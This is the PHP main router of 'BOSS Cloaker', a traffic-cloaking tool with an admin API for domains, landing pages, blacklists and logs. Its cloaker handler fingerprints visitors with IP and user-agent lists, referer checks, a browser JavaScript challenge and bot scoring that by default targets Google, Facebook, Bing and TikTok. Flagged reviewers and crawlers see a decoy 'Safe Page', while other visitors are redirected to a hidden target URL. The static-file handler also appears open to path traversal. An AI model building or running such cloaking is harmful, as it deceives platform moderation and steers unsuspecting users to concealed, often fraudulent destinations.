<?php
/**
 * BOSS Cloaker - Main API Router
 * Plesk/PHP compatible - All API requests route through here
 */

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/storage.php';
require_once __DIR__ . '/lib/detector.php';

// Start session with explicit cookie params (configured in config.php)
if (session_status() === PHP_SESSION_NONE) {
    session_name('boss_session');
    session_start();
}

// Set CORS headers
setCorsHeaders();

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// Get the request path
$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
$path = parse_url($requestUri, PHP_URL_PATH);

// Clean up path - remove trailing slashes but keep leading slash
$path = '/' . trim($path, '/');
if ($path !== '/') {
    $path = rtrim($path, '/');
}

$method = $_SERVER['REQUEST_METHOD'];
$storage = getStorage();

// ============================================
// SEED DATA ON FIRST RUN
// ============================================
try {
    $storage->seedData();
} catch (Exception $e) {
    // Seeding errors are non-fatal
    error_log("Seeding error: " . $e->getMessage());
}

// ============================================
// ROUTING
// ============================================

// --- AUTH ROUTES ---
if ($path === '/api/auth/login' && $method === 'POST') {
    $body = getJsonBody();
    $username = $body['username'] ?? '';
    $password = $body['password'] ?? '';
    
    if (empty($username) || empty($password)) {
        jsonResponse(['message' => 'Geçersiz giriş'], 400);
    }
    
    $user = $storage->getUserByUsername($username);
    if (!$user) {
        jsonResponse(['message' => 'Geçersiz kullanıcı adı veya şifre'], 401);
    }
    
    if (!password_verify($password, $user['password'])) {
        jsonResponse(['message' => 'Geçersiz kullanıcı adı veya şifre'], 401);
    }
    
    // Regenerate session ID on login to prevent session fixation attacks
    session_regenerate_id(true);
    
    // Store user in session
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['login_time'] = time();
    
    unset($user['password']);
    jsonResponse(formatDomainRow($user));
}

if ($path === '/api/auth/logout' && $method === 'POST') {
    session_destroy();
    jsonResponse(['message' => 'Logged out']);
}

if ($path === '/api/auth/me' && $method === 'GET') {
    if (empty($_SESSION['user_id'])) {
        jsonResponse(['message' => 'Unauthorized'], 401);
    }
    $user = $storage->getUser($_SESSION['user_id']);
    if (!$user) {
        session_destroy();
        jsonResponse(['message' => 'Unauthorized'], 401);
    }
    unset($user['password']);
    jsonResponse(formatDomainRow($user));
}

// --- CLOAKER ENGINE ---
if (preg_match('#^/r/([a-zA-Z0-9]+)$#', $path, $matches)) {
    $slug = $matches[1];
    handleCloaker($slug, $storage);
    exit;
}

// --- ADMIN API (require auth) ---
// Check auth for all /api/ routes (except auth routes handled above)
if (strpos($path, '/api/') === 0 && !in_array($path, ['/api/auth/login', '/api/auth/logout', '/api/auth/me', '/api/challenge/verify'])) {
    if (empty($_SESSION['user_id'])) {
        jsonResponse(['message' => 'Unauthorized'], 401);
    }
}

// --- STATS ---
if ($path === '/api/stats/dashboard' && $method === 'GET') {
    $stats = $storage->getStats();
    $logs = $storage->getAccessLogs(10);
    $stats['recentLogs'] = array_map('formatLogRow', $logs);
    jsonResponse($stats);
}

// --- DOMAINS ---
if ($path === '/api/domains' && $method === 'GET') {
    $domains = $storage->getDomains();
    jsonResponse(array_map('formatDomainRow', $domains));
}

if ($path === '/api/domains' && $method === 'POST') {
    $body = getJsonBody();
    $domain = $storage->createDomain($body);
    jsonResponse(formatDomainRow($domain), 201);
}

if (preg_match('#^/api/domains/(\d+)$#', $path, $matches)) {
    $id = (int)$matches[1];
    
    if ($method === 'GET') {
        $domain = $storage->getDomain($id);
        if (!$domain) jsonResponse(['message' => 'Not found'], 404);
        jsonResponse(formatDomainRow($domain));
    }
    
    if ($method === 'PUT') {
        $body = getJsonBody();
        $domain = $storage->updateDomain($id, $body);
        jsonResponse(formatDomainRow($domain));
    }
    
    if ($method === 'DELETE') {
        $storage->deleteDomain($id);
        http_response_code(204);
        exit;
    }
}

// --- LANDING PAGES ---
if ($path === '/api/landing-pages' && $method === 'GET') {
    $pages = $storage->getLandingPages();
    jsonResponse(array_map('formatLandingPageRow', $pages));
}

if ($path === '/api/landing-pages' && $method === 'POST') {
    $body = getJsonBody();
    $page = $storage->createLandingPage($body);
    jsonResponse(formatLandingPageRow($page), 201);
}

if (preg_match('#^/api/landing-pages/(\d+)$#', $path, $matches)) {
    $id = (int)$matches[1];
    
    if ($method === 'PUT') {
        $body = getJsonBody();
        $page = $storage->updateLandingPage($id, $body);
        jsonResponse(formatLandingPageRow($page));
    }
    
    if ($method === 'DELETE') {
        $storage->deleteLandingPage($id);
        http_response_code(204);
        exit;
    }
}

// --- LOGS ---
if ($path === '/api/logs' && $method === 'GET') {
    $limit = (int)($_GET['limit'] ?? 100);
    $logs = $storage->getAccessLogs($limit);
    jsonResponse(array_map('formatLogRow', $logs));
}

// --- BLACKLIST IP ---
if ($path === '/api/blacklist/ip' && $method === 'GET') {
    jsonResponse(array_map('formatBlacklistRow', $storage->getIpBlacklist()));
}

if ($path === '/api/blacklist/ip' && $method === 'POST') {
    $body = getJsonBody();
    $ip = $body['ip'] ?? '';
    if (empty($ip)) jsonResponse(['error' => 'IP required'], 400);
    $entry = $storage->addToIpBlacklist($ip, $body['reason'] ?? null);
    jsonResponse(formatBlacklistRow($entry), 201);
}

if (preg_match('#^/api/blacklist/ip/(\d+)$#', $path, $matches)) {
    if ($method === 'DELETE') {
        $storage->removeFromIpBlacklist((int)$matches[1]);
        http_response_code(204);
        exit;
    }
}

// --- BLACKLIST UA ---
if ($path === '/api/blacklist/ua' && $method === 'GET') {
    jsonResponse(array_map('formatUaBlacklistRow', $storage->getUaBlacklist()));
}

if ($path === '/api/blacklist/ua' && $method === 'POST') {
    $body = getJsonBody();
    $pattern = $body['pattern'] ?? '';
    if (empty($pattern)) jsonResponse(['error' => 'Pattern required'], 400);
    $entry = $storage->addToUaBlacklist($pattern, $body['reason'] ?? null);
    jsonResponse(formatUaBlacklistRow($entry), 201);
}

if (preg_match('#^/api/blacklist/ua/(\d+)$#', $path, $matches)) {
    if ($method === 'DELETE') {
        $storage->removeFromUaBlacklist((int)$matches[1]);
        http_response_code(204);
        exit;
    }
}

// --- CHALLENGE VERIFY ---
if ($path === '/api/challenge/verify' && $method === 'POST') {
    $body = getJsonBody();
    $token = $body['token'] ?? '';
    $domainId = (int)($body['domainId'] ?? 0);
    $ip = getClientIP();
    $ua = getUserAgent();
    
    if (empty($token) || !$domainId) {
        jsonResponse(['verified' => false, 'error' => 'Missing token or domainId'], 400);
    }
    
    $verified = $storage->verifyChallengeToken($token, $ip, $domainId, $ua);
    jsonResponse(['verified' => $verified]);
}

// --- SETTINGS ---
if ($path === '/api/settings' && $method === 'GET') {
    $settings = $storage->getSettings();
    jsonResponse(array_map('formatSettingRow', $settings));
}

if ($path === '/api/settings' && $method === 'POST') {
    $body = getJsonBody();
    $key = $body['key'] ?? '';
    $value = $body['value'] ?? null;
    if (empty($key)) jsonResponse(['error' => 'Key required'], 400);
    $setting = $storage->setSetting($key, $value);
    jsonResponse(formatSettingRow($setting), 201);
}

if (preg_match('#^/api/settings/(.+)$#', $path, $matches)) {
    $key = urldecode($matches[1]);
    
    if ($method === 'GET') {
        $value = $storage->getSetting($key);
        jsonResponse(['key' => $key, 'value' => $value]);
    }
    
    if ($method === 'PUT') {
        $body = getJsonBody();
        $value = $body['value'] ?? null;
        $setting = $storage->setSetting($key, $value);
        jsonResponse(formatSettingRow($setting));
    }
    
    if ($method === 'DELETE') {
        $storage->deleteSetting($key);
        http_response_code(204);
        exit;
    }
}

// --- SERVE FRONTEND (SPA fallback) ---
// If no API route matched, serve the frontend
serveFrontend($path);

// ============================================
// CLOAKER ENGINE HANDLER
// ============================================
function handleCloaker(string $slug, Storage $storage): void {
    $ip = getClientIP();
    $userAgent = getUserAgent();
    $headers = getRequestHeaders();
    
    $domain = $storage->getDomainBySlug($slug);
    
    if (!$domain) {
        header('Content-Type: text/html; charset=utf-8');
        echo '<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>Welcome</h1><p>Page not found.</p></body></html>';
        return;
    }
    
    // 1. Check if redirect is disabled (warming mode)
    if (!$domain['redirect_enabled']) {
        showLandingPage($storage, $domain, $ip, $userAgent, 'REDIRECT_DISABLED');
        return;
    }
    
    // 2. Check IP Blacklist
    if ($storage->isIpBlacklisted($ip)) {
        showLandingPage($storage, $domain, $ip, $userAgent, 'IP_BLACKLISTED', 100);
        return;
    }
    
    // 2b. Check UA Blacklist
    if ($storage->isUaBlacklisted($userAgent)) {
        showLandingPage($storage, $domain, $ip, $userAgent, 'UA_BLACKLISTED', 100);
        return;
    }
    
    // 3. Check time-based scheduling
    if (!isWithinActiveHours($domain['active_hours'], $domain['active_days'], $domain['timezone'])) {
        showLandingPage($storage, $domain, $ip, $userAgent, 'OUTSIDE_ACTIVE_HOURS');
        return;
    }
    
    // 4. Check device targeting
    if (!isDeviceAllowed($userAgent, (bool)($domain['allow_mobile'] ?? true), (bool)($domain['allow_desktop'] ?? true))) {
        showLandingPage($storage, $domain, $ip, $userAgent, 'DEVICE_NOT_ALLOWED');
        return;
    }
    
    // 5. Check rate limiting
    $maxClicks = (int)($domain['max_clicks_per_ip'] ?? 0);
    $rateLimitWindow = (int)($domain['rate_limit_window'] ?? 3600);
    if ($maxClicks > 0) {
        if (!$storage->checkRateLimit($domain['id'], $ip, $maxClicks, $rateLimitWindow)) {
            showLandingPage($storage, $domain, $ip, $userAgent, 'RATE_LIMIT_EXCEEDED', 80);
            return;
        }
    }
    
    // 6. Check Direct Access
    $referer = trim($_SERVER['HTTP_REFERER'] ?? '');
    $hasValidReferer = !empty($referer) && $referer !== 'null' && $referer !== 'undefined';
    
    if ($domain['block_direct_access'] && !$hasValidReferer) {
        showLandingPage($storage, $domain, $ip, $userAgent, 'DIRECT_ACCESS_BLOCKED', 100);
        return;
    }
    
    // 7. Check JS Challenge
    if ($domain['js_challenge']) {
        $challengeToken = $_GET['vt'] ?? '';
        if (empty($challengeToken)) {
            $newToken = $storage->createChallengeToken($domain['id'], $ip, $userAgent);
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html>
<html>
<head>
  <title>Verifying...</title>
  <style>body{font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5;}.loader{border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
</head>
<body>
  <div style="text-align:center"><div class="loader" style="margin:0 auto"></div><p>Verifying your browser...</p></div>
  <script>
    (function(){
      var t="' . $newToken . '";
      var d=new Date();
      var c=d.getTimezoneOffset();
      var s=screen.width+"x"+screen.height;
      var n=navigator.plugins.length;
      setTimeout(function(){
        window.location.href=window.location.pathname+"?vt="+t+"&tz="+c+"&sr="+s+"&pl="+n;
      },1500);
    })();
  </script>
</body>
</html>';
            return;
        }
        
        $verified = $storage->verifyChallengeToken($challengeToken, $ip, $domain['id'], $userAgent);
        if (!$verified) {
            showLandingPage($storage, $domain, $ip, $userAgent, 'JS_CHALLENGE_FAILED', 90);
            return;
        }
    }
    
    // 8. Run bot detection
    $fullUrl = $_SERVER['REQUEST_URI'] ?? '';
    $domainSettings = [
        'blockDirectAccess' => (bool)($domain['block_direct_access'] ?? false),
        'blockedPlatforms' => $domain['blocked_platforms'] ?? 'google,facebook,bing,tiktok',
        'detectionLevel' => $domain['detection_level'] ?? 'high',
    ];
    $detection = detectBot($ip, $userAgent, $headers, $fullUrl, $domainSettings);
    
    // Log the access
    $storage->createAccessLog([
        'domainId' => $domain['id'],
        'ipAddress' => $ip,
        'userAgent' => $userAgent,
        'isBot' => $detection['isBot'] ? 1 : 0,
        'botScore' => $detection['score'],
        'botReasons' => json_encode($detection['reasons']),
        'destination' => $detection['isBot'] ? 'landing' : 'target',
        'headers' => json_encode($headers),
    ]);
    
    if ($detection['isBot']) {
        $page = $storage->getLandingPage((int)$domain['landing_page_id']);
        header('Content-Type: text/html; charset=utf-8');
        echo $page['html_content'] ?? '<!DOCTYPE html><html><body><h1>Safe Page</h1><p>Welcome to our community.</p></body></html>';
        return;
    }
    
    // 9. Increment rate limit counter
    if ($maxClicks > 0) {
        $storage->incrementRateLimit($domain['id'], $ip, $rateLimitWindow);
    }
    
    // 10. Perform redirect
    performRedirect($domain['target_url'], $domain['redirect_mode'] ?? '302');
}

function showLandingPage(Storage $storage, array $domain, string $ip, string $ua, string $reason, int $score = 0): void {
    $page = $storage->getLandingPage((int)($domain['landing_page_id'] ?? 0));
    $storage->createAccessLog([
        'domainId' => $domain['id'],
        'ipAddress' => $ip,
        'userAgent' => $ua,
        'isBot' => 1,
        'botScore' => $score,
        'botReasons' => json_encode([$reason]),
        'destination' => 'landing',
        'headers' => '{}',
    ]);
    header('Content-Type: text/html; charset=utf-8');
    echo $page['html_content'] ?? '<!DOCTYPE html><html><body><h1>Safe Page</h1><p>Welcome to our community.</p></body></html>';
}

function performRedirect(string $targetUrl, string $mode): void {
    switch ($mode) {
        case 'meta':
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($targetUrl) . '"><title>Redirecting...</title></head><body><p>Redirecting...</p></body></html>';
            break;
        case 'js':
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head><title>Loading...</title><script>window.location.href="' . htmlspecialchars($targetUrl, ENT_QUOTES) . '";</script></head><body><p>Loading...</p></body></html>';
            break;
        default:
            header('Location: ' . $targetUrl, true, 302);
            break;
    }
}

function isWithinActiveHours(?string $activeHours, ?string $activeDays, ?string $timezone): bool {
    if (empty($activeHours) && empty($activeDays)) return true;
    
    $tz = $timezone ?: 'Europe/Istanbul';
    try {
        $now = new DateTime('now', new DateTimeZone($tz));
    } catch (Exception $e) {
        $now = new DateTime('now');
    }
    
    $dayMap = ['Sun' => 7, 'Mon' => 1, 'Tue' => 2, 'Wed' => 3, 'Thu' => 4, 'Fri' => 5, 'Sat' => 6];
    $currentDay = $dayMap[$now->format('D')] ?? 1;
    $currentHour = (int)$now->format('G');
    $currentMinute = (int)$now->format('i');
    $currentTime = $currentHour * 60 + $currentMinute;
    
    // Check days
    if (!empty($activeDays)) {
        $days = array_map('intval', array_map('trim', explode(',', $activeDays)));
        if (!in_array($currentDay, $days)) return false;
    }
    
    // Check hours
    if (!empty($activeHours)) {
        $parts = explode('-', $activeHours);
        if (count($parts) === 2) {
            $startParts = explode(':', trim($parts[0]));
            $endParts = explode(':', trim($parts[1]));
            $startTime = (int)$startParts[0] * 60 + (int)($startParts[1] ?? 0);
            $endTime = (int)$endParts[0] * 60 + (int)($endParts[1] ?? 0);
            if ($currentTime < $startTime || $currentTime > $endTime) return false;
        }
    }
    
    return true;
}

function isDeviceAllowed(string $ua, bool $allowMobile, bool $allowDesktop): bool {
    $isMobile = (bool)preg_match('/mobile|android|iphone|ipad|ipod|blackberry|windows phone/i', $ua);
    if ($isMobile && !$allowMobile) return false;
    if (!$isMobile && !$allowDesktop) return false;
    return true;
}

// ============================================
// FORMAT FUNCTIONS (snake_case DB -> camelCase API)
// ============================================
function formatDomainRow(array $row): array {
    return [
        'id' => (int)($row['id'] ?? 0),
        'domain' => $row['domain'] ?? $row['username'] ?? '',
        'username' => $row['username'] ?? null,
        'email' => $row['email'] ?? null,
        'slug' => $row['slug'] ?? null,
        'targetUrl' => $row['target_url'] ?? null,
        'landingPageId' => isset($row['landing_page_id']) ? (int)$row['landing_page_id'] : null,
        'redirectEnabled' => (bool)($row['redirect_enabled'] ?? true),
        'detectionLevel' => $row['detection_level'] ?? 'high',
        'status' => $row['status'] ?? 'active',
        'allowedCountries' => $row['allowed_countries'] ?? null,
        'blockedCountries' => $row['blocked_countries'] ?? null,
        'blockDirectAccess' => (bool)($row['block_direct_access'] ?? false),
        'blockedPlatforms' => $row['blocked_platforms'] ?? 'google,facebook,bing,tiktok',
        'jsChallenge' => (bool)($row['js_challenge'] ?? false),
        'redirectMode' => $row['redirect_mode'] ?? '302',
        'activeHours' => $row['active_hours'] ?? null,
        'activeDays' => $row['active_days'] ?? null,
        'timezone' => $row['timezone'] ?? 'Europe/Istanbul',
        'maxClicksPerIp' => (int)($row['max_clicks_per_ip'] ?? 0),
        'rateLimitWindow' => (int)($row['rate_limit_window'] ?? 3600),
        'allowMobile' => (bool)($row['allow_mobile'] ?? true),
        'allowDesktop' => (bool)($row['allow_desktop'] ?? true),
        'isActive' => ($row['status'] ?? 'active') === 'active',
        'name' => $row['domain'] ?? $row['username'] ?? '',
        'createdAt' => $row['created_at'] ?? null,
        'updatedAt' => $row['updated_at'] ?? null,
        'lastLogin' => $row['last_login'] ?? null,
    ];
}

function formatLandingPageRow(array $row): array {
    return [
        'id' => (int)($row['id'] ?? 0),
        'name' => $row['name'] ?? '',
        'htmlContent' => $row['html_content'] ?? '',
        'cssContent' => $row['css_content'] ?? null,
        'jsContent' => $row['js_content'] ?? null,
        'thumbnail' => $row['thumbnail'] ?? null,
        'createdAt' => $row['created_at'] ?? null,
        'updatedAt' => $row['updated_at'] ?? null,
    ];
}

function formatLogRow(array $row): array {
    return [
        'id' => (int)($row['id'] ?? 0),
        'domainId' => isset($row['domain_id']) ? (int)$row['domain_id'] : null,
        'ipAddress' => $row['ip_address'] ?? null,
        'userAgent' => $row['user_agent'] ?? null,
        'asn' => $row['asn'] ?? null,
        'country' => $row['country'] ?? null,
        'isBot' => (bool)($row['is_bot'] ?? false),
        'botScore' => (int)($row['bot_score'] ?? 0),
        'botReasons' => $row['bot_reasons'] ?? null,
        'destination' => $row['destination'] ?? null,
        'headers' => $row['headers'] ?? null,
        'tlsFingerprint' => $row['tls_fingerprint'] ?? null,
        'createdAt' => $row['created_at'] ?? null,
    ];
}

function formatBlacklistRow(array $row): array {
    return [
        'id' => (int)($row['id'] ?? 0),
        'ipAddress' => $row['ip_address'] ?? '',
        'reason' => $row['reason'] ?? null,
        'addedAt' => $row['added_at'] ?? null,
    ];
}

function formatUaBlacklistRow(array $row): array {
    return [
        'id' => (int)($row['id'] ?? 0),
        'pattern' => $row['pattern'] ?? '',
        'reason' => $row['reason'] ?? null,
        'addedAt' => $row['added_at'] ?? null,
    ];
}

function formatSettingRow(array $row): array {
    return [
        'id' => (int)($row['id'] ?? 0),
        'key' => $row['setting_key'] ?? '',
        'value' => $row['setting_value'] ?? null,
        'updatedAt' => $row['updated_at'] ?? null,
    ];
}

// ============================================
// SERVE FRONTEND (SPA)
// ============================================
function serveFrontend(string $path): void {
    $publicDir = __DIR__ . '/../public';
    
    // Try to serve static file
    $filePath = $publicDir . $path;
    if ($path !== '/' && is_file($filePath)) {
        $ext = pathinfo($filePath, PATHINFO_EXTENSION);
        $mimeTypes = [
            'html' => 'text/html',
            'css' => 'text/css',
            'js' => 'application/javascript',
            'json' => 'application/json',
            'png' => 'image/png',
            'jpg' => 'image/jpeg',
            'jpeg' => 'image/jpeg',
            'gif' => 'image/gif',
            'svg' => 'image/svg+xml',
            'ico' => 'image/x-icon',
            'woff' => 'font/woff',
            'woff2' => 'font/woff2',
            'ttf' => 'font/ttf',
            'eot' => 'application/vnd.ms-fontobject',
            'map' => 'application/json',
        ];
        
        $contentType = $mimeTypes[$ext] ?? 'application/octet-stream';
        header('Content-Type: ' . $contentType);
        
        // Cache static assets
        if (in_array($ext, ['js', 'css', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'woff', 'woff2', 'ttf'])) {
            header('Cache-Control: public, max-age=31536000, immutable');
        }
        
        readfile($filePath);
        exit;
    }
    
    // SPA fallback - serve index.html
    $indexFile = $publicDir . '/index.html';
    if (is_file($indexFile)) {
        header('Content-Type: text/html; charset=utf-8');
        readfile($indexFile);
        exit;
    }
    
    // No frontend built yet
    http_response_code(404);
    echo '<!DOCTYPE html><html><body><h1>BOSS Cloaker</h1><p>Frontend not built yet. Run the build process first.</p></body></html>';
}
